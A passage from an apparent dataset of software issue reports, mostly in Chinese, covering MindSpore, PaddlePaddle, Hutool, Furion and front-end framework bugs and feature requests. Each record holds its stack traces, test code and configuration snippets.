org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:73) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:446) at com.sun.proxy.$Proxy61.selectList(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.selectList(SqlSessionTemplate.java:230) at org.apache.ibatis.binding.MapperMethod.executeForMany(MapperMethod.java:139) at org.apache.ibatis.binding.MapperMethod.execute(MapperMethod.java:76) at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:59) at com.sun.proxy.$Proxy65.findFailJobLogIds(Unknown Source) at com.xxl.job.admin.core.thread.JobFailMonitorHelper$1.run(JobFailMonitorHelper.java:49) at java.lang.Thread.run(Thread.java:748) Caused by: com.mysql.jdbc.exceptions.jdbc4.MySQLNonTransientConnectionException: No operations allowed after connection closed. at sun.reflect.GeneratedConstructorAccessor62.newInstance(Unknown Source) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.lang.reflect.Constructor.newInstance(Constructor.java:423) at com.mysql.jdbc.Util.handleNewInstance(Util.java:425) at com.mysql.jdbc.Util.getInstance(Util.java:408) at com.mysql.jdbc.SQLError.createSQLException(SQLError.java:919) at com.mysql.jdbc.SQLError.createSQLException(SQLError.java:898) at com.mysql.jdbc.SQLError.createSQLException(SQLError.java:887) at com.mysql.jdbc.SQLError.createSQLException(SQLError.java:861) at com.mysql.jdbc.ConnectionImpl.throwConnectionClosedException(ConnectionImpl.java:1192) at com.mysql.jdbc.ConnectionImpl.checkClosed(ConnectionImpl.java:1187) at com.mysql.jdbc.ConnectionImpl.prepareStatement(ConnectionImpl.java:4067) at com.mysql.jdbc.ConnectionImpl.prepareStatement(ConnectionImpl.java:4036) at sun.reflect.GeneratedMethodAccessor57.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.tomcat.jdbc.pool.ProxyConnection.invoke(ProxyConnection.java:126) at org.apache.tomcat.jdbc.pool.JdbcInterceptor.invoke(JdbcInterceptor.java:108) at org.apache.tomcat.jdbc.pool.interceptor.AbstractCreateStatementInterceptor.invoke(AbstractCreateStatementInterceptor.java:75) at org.apache.tomcat.jdbc.pool.JdbcInterceptor.invoke(JdbcInterceptor.java:108) at org.apache.tomcat.jdbc.pool.DisposableConnectionFacade.invoke(DisposableConnectionFacade.java:81) at com.sun.proxy.$Proxy78.prepareStatement(Unknown Source) at org.apache.ibatis.executor.statement.PreparedStatementHandler.instantiateStatement(PreparedStatementHandler.java:87) at org.apache.ibatis.executor.statement.BaseStatementHandler.prepare(BaseStatementHandler.java:88) at org.apache.ibatis.executor.statement.RoutingStatementHandler.prepare(RoutingStatementHandler.java:59) at org.apache.ibatis.executor.SimpleExecutor.prepareStatement(SimpleExecutor.java:85) at org.apache.ibatis.executor.SimpleExecutor.doQuery(SimpleExecutor.java:62) at org.apache.ibatis.executor.BaseExecutor.queryFromDatabase(BaseExecutor.java:326) at org.apache.ibatis.executor.BaseExecutor.query(BaseExecutor.java:156) at org.apache.ibatis.executor.CachingExecutor.query(CachingExecutor.java:109) at org.apache.ibatis.executor.CachingExecutor.query(CachingExecutor.java:83) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:148) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:141) at sun.reflect.GeneratedMethodAccessor97.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:433) ... 8 common frames omitted Caused by: com.mysql.jdbc.exceptions.jdbc4.CommunicationsException: Communications link failure The last packet successfully received from the server was 923 milliseconds ago. The last packet sent successfully to the server was 407 milliseconds ago. at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.lang.reflect.Constructor.newInstance(Constructor.java:423) at com.mysql.jdbc.Util.handleNewInstance(Util.java:425) at com.mysql.jdbc.SQLError.createCommunicationsException(SQLError.java:990) at com.mysql.jdbc.MysqlIO.reuseAndReadPacket(MysqlIO.java:3562) at com.mysql.jdbc.MysqlIO.reuseAndReadPacket(MysqlIO.java:3462) at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:3905) at com.mysql.jdbc.MysqlIO.sendCommand(MysqlIO.java:2530) at com.mysql.jdbc.MysqlIO.sqlQueryDirect(MysqlIO.java:2683) at com.mysql.jdbc.ConnectionImpl.execSQL(ConnectionImpl.java:2495) at com.mysql.jdbc.PreparedStatement.executeInternal(PreparedStatement.java:1903) at com.mysql.jdbc.PreparedStatement.execute(PreparedStatement.java:1242) at sun.reflect.GeneratedMethodAccessor56.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.tomcat.jdbc.pool.StatementFacade$StatementProxy.invoke(StatementFacade.java:114) at com.sun.proxy.$Proxy79.execute(Unknown Source) at org.apache.ibatis.executor.statement.PreparedStatementHandler.query(PreparedStatementHandler.java:63) at org.apache.ibatis.executor.statement.RoutingStatementHandler.query(RoutingStatementHandler.java:79) at org.apache.ibatis.executor.SimpleExecutor.doQuery(SimpleExecutor.java:63) at org.apache.ibatis.executor.BaseExecutor.queryFromDatabase(BaseExecutor.java:326) at org.apache.ibatis.executor.BaseExecutor.query(BaseExecutor.java:156) at org.apache.ibatis.executor.CachingExecutor.query(CachingExecutor.java:109) at org.apache.ibatis.executor.CachingExecutor.query(CachingExecutor.java:83) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:148) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:141) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectOne(DefaultSqlSession.java:77) at sun.reflect.GeneratedMethodAccessor67.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:433) at com.sun.proxy.$Proxy61.selectOne(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.selectOne(SqlSessionTemplate.java:166) at org.apache.ibatis.binding.MapperMethod.execute(MapperMethod.java:83) at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:59) at com.sun.proxy.$Proxy64.loadById(Unknown Source) at com.xxl.job.admin.core.trigger.XxlJobTrigger.trigger(XxlJobTrigger.java:43) at com.xxl.job.admin.core.thread.JobTriggerPoolHelper$3.run(JobTriggerPoolHelper.java:76) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) ... 1 common frames omitted Caused by: java.net.SocketException: Software caused connection abort: recv failed at java.net.SocketInputStream.socketRead0(Native Method) at java.net.SocketInputStream.socketRead(SocketInputStream.java:116) at java.net.SocketInputStream.read(SocketInputStream.java:171) at java.net.SocketInputStream.read(SocketInputStream.java:141) at sun.security.ssl.InputRecord.readFully(InputRecord.java:465) at sun.security.ssl.InputRecord.read(InputRecord.java:503) at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:975) at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:933) at sun.security.ssl.AppInputStream.read(AppInputStream.java:105) at com.mysql.jdbc.MysqlIO.readFully(MysqlIO.java:3011) at com.mysql.jdbc.MysqlIO.reuseAndReadPacket(MysqlIO.java:3472) ... 36 common frames omitted   <code>: xxl_job_log alarm_status"
[CT][MS][OCCM][tensorscattersub] 算子在ascend上vmap出现报错显示,"算子只在ascend上运行用例test_tensorscattersub_4d_vmap 出现报错，显示 @hanson def test_tensorscattersub_4d_vmap(): input_x = Tensor(np.random.randn(16, 16, 16, 16).astype(np.float32)) indices_shape = (8, 1, 16, 16) pro = 1 for i in indices_shape: pro *= i indices = Tensor(np.random.randint(12, size=pro).reshape(indices_shape).astype(np.int32)) update = Tensor(np.random.randn(8, 16, 16, 16).astype(np.float32)) fact = TensorScatterSubMock(inputs=[input_x, indices, update]) test_tensorscattersub.py:651: ../share/ops/primitive/tensorscattersub_ops.py:148: in forward_vmap_cmp self.vmap_cmp(net, in_axes, run_time, improve_times, *inputs) self = TensorScatterSubMock&lt;&gt;, net = WrapOp&lt;&gt;, in_axes = -1, run_time = 100, improve_times = 2 inputs = (Tensor(shape=[16, 16, 16, 16], dtype=Float32, value= [[[[-1.68073654e+00, 7.68860877e-01, 1.23529816e+00 ... -4.788...-01], [ 8.75537097e-01, -2.51331568e-01, -1.20943926e-01 ... 1.23746419e+00, 2.38933936e-01, -1.02891266e+00]]]])) nest_net_vmap = &lt;function _Vmap.call..after_vmap at 0xffff79cbe200&gt; nest_output = Tensor(shape=[16, 16, 16, 16], dtype=Float32, value= [[[[-1.64369845e+00, -8.45171213e-01, -6.78903088e-02 ... -1.7820...e+00], [ 4.26033914e-01, -1.09668946e+00, -5.16165137e-01 ... -4.23732042e-01, 3.50085318e-01, 1.23725140e+00]]]]) nest_end_to_end_duration = 39.91798392000055 E AssertionError ../share/meta.py:506: AssertionError Hardware Environment() / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_tensorscattersub_4d_vmap 正常用例通过   <code>: fact.forward_vmap_cmp() def vmap_cmp(self, net, in_axes, run_time, improve_times, *inputs): ''' vmap for op forward and grad :param net: the vmap net for forward and grad :param in_axes: the batch parameter :param run_time: the times for running :param improve_times: the improve times which vmap is better than for :param inputs: the inputs :return: the assert results ''' self.pure_net_vmap = vmap(net, in_axes=in_axes, out_axes=0) nest_net_vmap = self.nest_net_vmap(net, in_axes) # Call self net to warm up op.Abs()(Tensor(5.0)) _pynative_executor.sync() self.time_stamp() # End To End nest vmap time(compile graph + run graph). nest_output = nest_net_vmap(*inputs) _pynative_executor.sync() nest_end_to_end_duration = self.time_stamp() # Total nest vmap time(run_graph). for _ in range(run_time): nest_output = nest_net_vmap(*inputs) _pynative_executor.sync() total_nest_stamp = self.time_stamp() nest_duration = total_nest_stamp / run_time # End to End foreach vamp time(compile graph + run graph). foreach_output = self.foreach_vmap(*inputs) _pynative_executor.sync() foreach_end_to_end_duration = self.time_stamp() # Total foreach vmap time(run_graph). for _ in range(run_time): foreach_output = self.foreach_vmap(*inputs) _pynative_executor.sync() total_foreach_stamp = self.time_stamp() foreach_duration = total_foreach_stamp / run_time logger.info(""foreach_end_to_end_duration: {}"".format(foreach_end_to_end_duration)) logger.info(""nest_end_to_end_duration: {}"".format(nest_end_to_end_duration)) logger.info(""foreach_duration: {}"".format(foreach_duration)) logger.info(""nest_duration: {}"".format(nest_duration)) logger.info(""improve_times: {}"".format(foreach_duration / nest_duration)) if isinstance(nest_output, (tuple, list)): num = len(nest_output) for i in range(num): allclose_nparray(nest_output[i].asnumpy(), foreach_output[i].asnumpy(), self.loss, self.loss) else: allclose_nparray(nest_output.asnumpy(), foreach_output.asnumpy(), self.loss, self.loss) assert foreach_end_to_end_duration &gt; nest_end_to_end_duration assert foreach_duration &gt; nest_duration * improve_times"
Softsign Operator.,formula Activation implementation in Paddle: https://github.com/PaddlePaddle/Paddle/blob/develop/paddle/operators/activation_op.h   <code>: y = x / (abs(x) + 1).
官网 datetime日期时间无法设置24小时制,"使用avue，代码如下   <code>: option: { indexLabel:'序号', height:'auto', calcHeight: 30, tip: true, searchShow: true, searchMenuSpan: 6, border: true, index: true, viewBtn: true, selection: true, dialogClickModal: false, column: [ { label: ""开始时间"", type: 'datetime', prop: ""startTime"", format:'yyyy-MM-dd hh:mm:ss', valueFormat:'yyyy-MM-dd hh:mm:ss', rules: [{ required: true, message: ""请输入开始时间"", trigger: ""blur"" }], mock:{ type:'datetime', format:'yyyy-MM-dd hh:mm:ss', now:true, }, width: 150, }, ] }"
CRFLayer.cpp:69] Check failed: starts[numSequences] == batchSize,"用crf做序列标注的时候遇到了这个问题。 报的错误如下：   <code>: I1205 17:55:54.326232 2874 GradientMachine.cpp:85] Initing parameters.. I1205 17:56:01.181100 2874 GradientMachine.cpp:92] Init parameters done. Pass 0, Batch 0, Cost 12.474894, {'__sum_evaluator_0__': 0.8558558821678162} F1205 17:56:12.869208 2874 CRFLayer.cpp:69] Check failed: starts[numSequences] == batchSize (797 vs. 798) *** Check failure stack trace: *** @ 0x7f72874917ed google::LogMessage::Fail() @ 0x7f7287493b38 google::LogMessage::SendToLog() @ 0x7f72874912db google::LogMessage::Flush() @ 0x7f7287494a0e google::LogMessageFatal::~LogMessageFatal() @ 0x7f72870f8362 paddle::CRFLayer::forward() @ 0x7f7287134049 paddle::NeuralNetwork::forward() @ 0x7f72874612d0 GradientMachine::forwardBackward() @ 0x7f7286f65394 _wrap_GradientMachine_forwardBackward @ 0x4cb45e PyEval_EvalFrameEx @ 0x4c2765 PyEval_EvalCodeEx @ 0x4ca8d1 PyEval_EvalFrameEx @ 0x4c2765 PyEval_EvalCodeEx @ 0x4ca099 PyEval_EvalFrameEx @ 0x4c2765 PyEval_EvalCodeEx @ 0x4ca099 PyEval_EvalFrameEx @ 0x4c2765 PyEval_EvalCodeEx @ 0x4ca8d1 PyEval_EvalFrameEx @ 0x4c2765 PyEval_EvalCodeEx @ 0x4c2509 PyEval_EvalCode @ 0x4f1def (unknown) @ 0x4ec652 PyRun_FileExFlags @ 0x4eae31 PyRun_SimpleFileExFlags @ 0x49e14a Py_Main @ 0x7f72c90de830 __libc_start_main @ 0x49d9d9 _start @ (nil) (unknown) Aborted (core dumped)"
【众智】【计算-AICPU开发】Imag,"AICPU算子接入 返回复数的虚部。 input output 对应底层算子 对应底层AICPU算子Imag: (Tout实际未用到，且为了避免与库上接口冲突，故删了此参数 @ops.RegisterGradient(""Imag"")   <code>: class Imag(Primitive):"
ListUtil filter 方法不存在,"JDK版本： openjdk_8_201 hutool版本： 5.8.4   <code>: List&lt;String&gt; a = ListUtil.toLinkedList(""1"", ""2"", ""3""); // 结果: [edit1, edit2, edit3] List&lt;String&gt; filter = ListUtil.filter(a, str -&gt; ""edit"" + str);"
mips 编译卡Built target analysis_predictor，无报错,1）PaddlePaddle版本：2.0 2）CPU：Loongson-3A4000 3）GPU：无 4）系统环境：Kylin Linux Advanced Server release V10 (Tercel) localdomain 4.19.90-21.3.ky10.mips64el 内存8G 5）python：3.6.8 安装方式信息： 1）本地编译：根据官网文档 cmake .. -DPY_VERSION=3 -DPYTHON_EXECUTABLE= -DWITH_MIPS=ON -DWITH_TESTING=OFF -DCMAKE_BUILD_TYPE=Release -DON_INFER=ON -DWITH_XBYAK=OFF -DWITH_MKL=OFF make -j4 问题描述：无任何报错，卡在[ 52%] Built target analysis_predictor 尝试过最新的2.2版本，依然是卡在这个构建上。   <code>: which python3
Inplement GPU `Ceil` operator,"RFC Operators are the basic elements of deep learning model. At present, some operators are still missing in the GPU backend. Goal: Please implement a GPU operator . The specification of is shown https://www.mindspore.cn/doc/api_python/en/r1.2/mindspore/ops/mindspore.ops.Ceil.html?highlight=ceil#mindspore.ops.Ceil The GPU operator develop tutorials：https://www.mindspore.cn/tutorial/training/zh-CN/r1.2/advanced_use/custom_operator_gpu.html The frontend Primitive is already defined, so you only implement backend kernel. The is similar with defined in those files mindspore/ccsrc/backend/kernel_compiler/gpu/math/unary_op_gpu_kernel.cc mindspore/ccsrc/backend/kernel_compiler/gpu/math/unary_op_gpu_kernel.h mindspore/ccsrc/backend/kernel_compiler/gpu/cuda_impl.cu mindspore/ccsrc/backend/kernel_compiler/gpu/cuda_impl.cuh Trail No. Task Description Related Issue(URL) 1 2   <code>: Ceil Ceil Ceil Floor"
数据超过100条，这句话执行报错,"使用的JDK版本和Hutool版本 JDK 1.8.0 Hutool 4.5.4 最新版本也试了 问题描述（包括截图） //设置样式 输出数据后 设置第一行高度 writer.setRowHeight(0, 25);   <code>: 报错信息 2019-08-12 08:32:34 ERROR cn.web.common.base.SpringController.exception(42) : java.lang.NullPointerException at cn.hutool.poi.excel.ExcelWriter.setRowHeight(ExcelWriter.java:435) at cn.web.business.models.controller.InvoiceController.export(InvoiceController.java:336) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:497) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:221) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:137) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:111) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:806) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:729) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:85) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:959) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:893) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:970) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:861) at javax.servlet.http.HttpServlet.service(HttpServlet.java:622) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:846)"
UnitOfWork 在多个上下文时的事务问题,"Furion 版本号 4.0.4 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 存在多个不同 Context 的情况下开启工作单元，会出现 The specified transaction is not associated with the current connection. Only transactions associated with the current connection may be used. 在 Microsoft.EntityFrameworkCore.Storage.RelationalTransaction..ctor(IRelationalConnection connection, DbTransaction transaction, Guid transactionId, IDiagnosticsLogger1 logger, Boolean transactionOwned) 在 Microsoft.EntityFrameworkCore.Storage.RelationalConnection.UseTransaction(DbTransaction transaction, Guid transactionId) 在 Furion.DatabaseAccessor.DbContextPool.&lt;&gt;c__DisplayClass22_0.b__1(KeyValuePair2.GetCount(Boolean onlyIfCheap) 在 System.Linq.Enumerable.Count[TSource](IEnumerable`1 source) 在 Furion.DatabaseAccessor.DbContextPool.ShareTransaction(DbTransaction transaction) 在 Furion.DatabaseAccessor.DbContextPool.BeginTransaction(Boolean ensureTransaction) 在 Furion.DatabaseAccessor.UnitOfWorkFilter.d__4.MoveNext() 在 System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw() 在 System.Runtime.CompilerServices.TaskAwaiter.ThrowForNonSuccess(Task task) 在 System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task) 在 System.Runtime.CompilerServices.TaskAwaiter.GetResult() 在 Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.&lt;g__Awaited|10_0&gt;d.MoveNext() 在 System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw() 在 Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context) 在 Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State&amp; next, Scope&amp; scope, Object&amp; state, Boolean&amp; isCompleted) 在 Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.InvokeInnerFilterAsync() --- 上一位置中堆栈跟踪的末尾 --- 在 System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw() 在 System.Runtime.CompilerServices.TaskAwaiter.ThrowForNonSuccess(Task task) 在 System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task) 在 System.Runtime.CompilerServices.TaskAwaiter.GetResult() 在 Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.&lt;g__Awaited|26_0&gt;d.MoveNext() 必须提供完整可运行且包含错误的 仓库 DEMO，DEMO 提供最简单的错误逻辑代码，否则不予处理。 重现代码放在文叔叔 https://t.wss.ink/f/8we673vymkr [] Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos 问题修复或者有其他解决方案   <code>: 1 logger, Boolean transactionOwned, ISqlGenerationHelper sqlGenerationHelper) 在 Microsoft.EntityFrameworkCore.Storage.RelationalTransactionFactory.Create(IRelationalConnection connection, DbTransaction transaction, Guid transactionId, IDiagnosticsLogger 2 u) 在 System.Linq.Enumerable.WhereSelectEnumerableIterator"
form自定义提交bug,"第一种提交的子表数据如下   <code>: var mainform = $(""#inputForm""); $(""#inputForm"").validate({ submitHandler: function(form){ mainform.attr('action','${ctx}/supply/pursolution/quote/save'); js.ajaxSubmitForm($(form), function(data){ js.showMessage(data.message); if(data.result == Global.TRUE){ js.closeCurrentTabPage(function(contentWindow){ contentWindow.page(); }); } }, ""json""); } }); //提交 $(""#btnSubmit"").click(function () { mainform.attr('action','${ctx}/supply/pursolution/quote/save'); js.ajaxSubmitForm(mainform, function(data){ js.showMessage(data.message); if(data.result == Global.TRUE){ js.closeCurrentTabPage(function(contentWindow){ contentWindow.page(); }); } }, ""json""); });"
小白求助，upload模块上传时后端（flask框架）怎么获取（图片）文件，F12查看前端传参file:（binary）,"我想用flask框架写个上传图片的接口，通过layui上传图片，后端接收图片进行处理上传到阿里云oss； 前端部分复制的官网文档示例；如下 html部分 js部分 F12查看前端的传参是file：(binary)，后端读取file的值是个空字符串。 我想知道后端怎么获取layui.upload上传的文件（图片）；或者把layui.upload上传文件（图片）的base64数据传给后端   <code>: &lt;div class=""layui-upload""&gt; &lt;button type=""button"" class=""layui-btn"" id=""test1"" &gt;上传图片&lt;/button&gt; &lt;div class=""layui-upload-list""&gt; &lt;img class=""layui-upload-img"" id=""demo1"" style=""width: 100px;height: 100px""&gt; &lt;p id=""demoText""&gt;&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; layui.use('upload', function(){ var upload = layui.upload; //执行实例 var uploadInst = upload.render({ elem: '#test1' //绑定元素 ,url: '/uploadImg' //上传接口 ,before: function(obj){ obj.preview(function(index, file, result){ $('#demo1').attr('src', result); //图片链接（base64） }); } ,done: function(res){ // } ,error: function(){ //请求异常回调 } }); });"
增加ContentTypeUtil,JDK版本： openjdk_8_241 hutool版本： 5.3.9 根据contentType获取后缀，如根据image/png，获取后缀为png   <code>: public static String getSubType(String contextType) { if (contextType == null) { return null; } int index = contextType.indexOf('/'); if (index == -1) { return null; } else { int subTypeStartIndex = index + 1; if (subTypeStartIndex &lt; contextType.length()) { return contextType.substring(subTypeStartIndex); } else { return null; } } }
lstm,Check out this page to find out much more about markdown.   <code>: how do you run your code? what system do you use? Are you using GPU or not?
[CT][MS][SparseAddmm]输入值与定义的维度不一致的情况下抛出RuntimeError，应该是ValueError,"输入值与定义的维度不一致的情况下抛出RuntimeError，应该是ValueError / 硬件环境: device ascend/CPU : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): mode pynative mode graph   <code>: def test_sparse_addmm_beta_dims_unsupport(): input_x1 = Tensor(np.random.randint(low=0, high=4, size=(3, 2)), dtype=mstype.int32) input_x2 = Tensor(np.random.randn(3), dtype=mstype.int64) input_x3 = Tensor([4, 4], dtype=mstype.int32) input_x4 = Tensor(np.random.randint(low=0, high=4, size=(4, 4)), dtype=mstype.int64) input_x5 = Tensor(np.random.randint(low=0, high=4, size=(4, 4)), dtype=mstype.int64) input_x6 = Tensor(np.random.randint(low=0, high=4, size=(1)), dtype=mstype.int64) input_x7 = Tensor(np.random.randint(low=0, high=4, size=(1, 2)), dtype=mstype.int64) fact = SparseAddmmMock(inputs=[input_x1, input_x2, input_x3, input_x4, input_x5, input_x6, input_x7]) with pytest.raises(ValueError) as err: fact.forward_mindspore_impl() assert ""the input shape should have rank 1, but got 2"" in str(err.value) obj = Prim[SparseAddmm]&lt;cust_aicpu=SparseAddmm&gt;, op_name = 'SparseAddmm' args = (Tensor(shape=[3, 2], dtype=Int32, value= [[2, 0], [1, 3], [1, 2]]), Tensor(shape=[3], dtype=Int64, value= [0, 0, 0]..., value= [[1, 2, 2, 1], [3, 3, 0, 1], [3, 3, 2, 1], [2, 3, 3, 0]]), Tensor(shape=[1], dtype=Int64, value= [3]), ...) @_wrap_func def _run_op(obj, op_name, args): """"""Single op execution function supported by ge in PyNative mode."""""" &gt; output = real_run_op(obj, op_name, args) E RuntimeError: For 'SparseAddmm', the input shape should have rank 1, but got 2. E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/core/ops/sparse_addmm.cc:74 SparseAddmmInferShape /root/miniconda3/envs/zhanglin3.7/lib/python3.7/site-packages/mindspore/ops/primitive.py:755: RuntimeError"
is the mse layer really divide by the number of size ? ,"In the mse_cost in Layers.py. We see the description is $\frac{1}{N}\sum_{i=1}^N(t _i- y_i)^2$, I think N is the size of each item However, when I check the implementation it calls sumofsquarediff, which does not do a normalization of layer size N. I think it is a wrong description of the mse_cost layer ?   <code>: @wrap_name_default() @layer_support() def mse_cost(input, label, weight=None, name=None, layer_attr=None): """""" mean squared error cost: .. math:: $\frac{1}{N}\sum_{i=1}^N(t _i- y_i)^2$ :param name: layer name. :type name: basestring :param input: Network prediction. :type input: LayerOutput :param label: Data label. :type label: LayerOutput :param weight: The weight affects the cost, namely the scale of cost. It is an optional argument. :type weight: LayerOutput :param layer_attr: layer's extra attribute. :type layer_attr: ExtraLayerAttribute :return: LayerOutput object. :rtype: LayerOutput """""" ipts, parents = __cost_input__(input, label, weight) Layer( inputs=ipts, type=""square_error"", name=name, **ExtraLayerAttribute.to_kwargs(layer_attr)) return LayerOutput(name, LayerType.COST, parents=parents, size=1)"
pig-parent 内置 excel 插件 方便引用,pig版本: 3.3.1 是否修改包名: 否   <code>: &lt;!-- excel 导入导出 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.pig4cloud.excel&lt;/groupId&gt; &lt;artifactId&gt;excel-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;0.5.0&lt;/version&gt; &lt;/dependency&gt;
swagger在Furion + SqlSugar仓储下报错,"Furion 版本号 4.2.0 .NET SDK 版本号 .net6 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 我用官方的脚手架Furion + SqlSugar新建了一个项目，用默认的DbContext获取数据库上下文，访问swagger是正常的，但是当我启用仓储模式的时候，代码调试也还是正常的，函数也是正常的，就是swagger提示错误 必须提供完整可运行且包含错误的 仓库 DEMO，DEMO 提供最简单的错误逻辑代码，否则不予处理。 链接：https://pan.baidu.com/s/1AqmyiL6guIWhWcMIPH9Etw 提取码：cg8b [] Sqlite [x ] SqlServer Mysql Oracle PGSql Firebird Cosmos swagger能够正常运行   <code>: InvalidOperationException: Can't use schemaId ""$DbType"" for type ""$System.Data.DbType"". The same schemaId is already used for type ""$SqlSugar.DbType"" Swashbuckle.AspNetCore.SwaggerGen.SchemaRepository.RegisterType(Type type, string schemaId) SwaggerGeneratorException: Failed to generate schema for type - SqlSugar.ISqlSugarClient. See inner exception Swashbuckle.AspNetCore.SwaggerGen.SwaggerGenerator.GenerateSchema(Type type, SchemaRepository schemaRepository, PropertyInfo propertyInfo, ParameterInfo parameterInfo, ApiParameterRouteInfo routeInfo) SwaggerGeneratorException: Failed to generate Operation for action - test1.Application.SystemService.AsSugarClient (test1.Application). See inner exception Swashbuckle.AspNetCore.SwaggerGen.SwaggerGenerator.GenerateOperation(ApiDescription apiDescription, SchemaRepository schemaRepository)"
[MS][特性补齐-Randperm]test case has RuntimeError on CPU,"cpu场景不封用例执行失败 / 硬件环境: /device CPU : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_p_randperm_input_int64_output_float32、 test_p_randperm_input_int64_output_float64、 test_p_randperm_n_0、test_p_randperm_n_0、 test_p_randperm_dynamic_shape_input_int32_output_float16、 test_p_randperm_dynamic_shape_input_int64_output_int64、 test_p_randperm_n_20_max_len_20_pad_2_dtype_int32（仅Graph模式）、 test_p_randperm_n_10_max_len_30_pad_99_dtype_int8（仅Graph模式）、 test_p_randperm_n_1_max_len_1_pad_neg1_dtype_int16（仅Graph模式）、 test_p_randperm_n_2_max_len_9_pad_neg59_dtype_int64（仅Graph模式）、 test_p_randperm_n_1_max_len_1_pad_0_dtype_uint8（仅Graph模式）、 test_p_randperm_n_8_max_len_10_pad_8_dtype_uint16（仅Graph模式）、 test_p_randperm_n_8_max_len_10_pad_99_dtype_uint32（仅Graph模式）、 test_p_randperm_n_8_max_len_10_pad_99_dtype_uint64（仅Graph模式） def test_p_randperm_dynamic_shape_input_int32_output_float16(): n = Tensor([20], dtype=mstype.int32) fact = RandpermMock(attributes={'max_length': 30, 'pad': -2, 'dtype': mstype.float16}, inputs=n) test_randperm.py:370: ../share/ops/primitive/randperm_ops.py E mindspore/ccsrc/plugin/device/cpu/hal/hardware/cpu_device_context.cc:290 SetOperatorInfo /root/archiconda3/envs/sjx/lib/python3.7/site-packages/mindspore/common/api.py:987: RuntimeError <ol start=""3""> pass   